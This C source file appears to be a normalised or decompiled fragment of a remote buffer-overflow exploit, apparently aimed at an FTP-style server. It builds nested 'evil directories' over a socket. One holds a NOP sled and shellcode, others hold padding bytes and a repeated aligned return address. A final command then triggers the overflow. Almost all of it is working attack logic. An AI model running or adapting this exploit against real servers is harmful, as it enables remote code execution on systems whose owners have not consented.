#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  dir ;

/* Variables and functions */
 char NOP ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC1 (int,char*) ; 
 int /*<<< orphan*/  FUNC2 (int,char*) ; 
 unsigned long FUNC3 (unsigned long) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,size_t) ; 
 int /*<<< orphan*/  FUNC5 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 char* FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 size_t FUNC10 (char*) ; 

int FUNC11(int sock, char *homedir, unsigned long addy, char *shellcode)
{
    char dir[300];
    int i = 0, j = 0;
    int total = FUNC10(homedir) + 1;
    int align;
    char *rstring = FUNC7();

    /* go to the writeable directory */
    if(!FUNC1(sock, homedir))
    {
	FUNC0(stderr, "[-] Failed to change directory, aborting!\n");
	return 0;
    }

    for(i = 0; i < 4; i++)
    {
	FUNC5(dir, 0x0, sizeof(dir));

	switch(i)
	{
	case 0: /* first dir == shellcode */
	    FUNC4(dir, rstring, FUNC10(rstring));
	    FUNC5(dir + FUNC10(rstring), NOP, 255 - FUNC10(rstring));
	    FUNC4(&dir[(255 - FUNC10(shellcode))], shellcode, FUNC10(shellcode));
	    break;

	case 3: /* address buffer */
	    /* calculate the alignment */
	    align = total % sizeof(long);
	    align = sizeof(long) - align;

	    FUNC6("[3] Calculated alignment = %d, total = %d\n", 
		   align, total);

	    FUNC9(dir, "XXXX");
	    FUNC5(dir + 4, 'X', align);
	   
	    for(j = 4 + align; j < 250; j += 4)
	    {
		/* leet portable bit shifting */
		/*   brought to you by trey   */
		unsigned long p_addy = FUNC3(addy);
		dir[j + 0] = p_addy & 0xff;
		dir[j + 1] = (p_addy & 0xff00) >> 8;
		dir[j + 2] = (p_addy & 0xff0000) >> 16;
		dir[j + 3] = (p_addy & 0xff000000) >> 24;
	    }
	    break;
	
	default: /* cases 1 and 2, extra overflow bytes */
	    FUNC5(dir, 'X', 255);
	    break;

	}

	total += FUNC10(dir) + 1;

	if(!FUNC2(sock, dir))
	{
	    FUNC0(stderr, "[-] Failed to generate directories, aborting!\n");
	    return 0;
	}
	
	if(!FUNC1(sock, dir))
	{
	    FUNC0(stderr, "[-] Failed to change directory, aborting!\n");
	    return 0;
	}
    }

    FUNC6("[4] Evil directories created.\n");
    
    if(!FUNC1(sock, homedir))
    {
	FUNC0(stderr, "[-] Failed to cwd back to %s, aborting!\n", homedir);
	return 0;
    }
    
    /* perform the final attack */
    FUNC8(sock, rstring);
	
    return 1;
}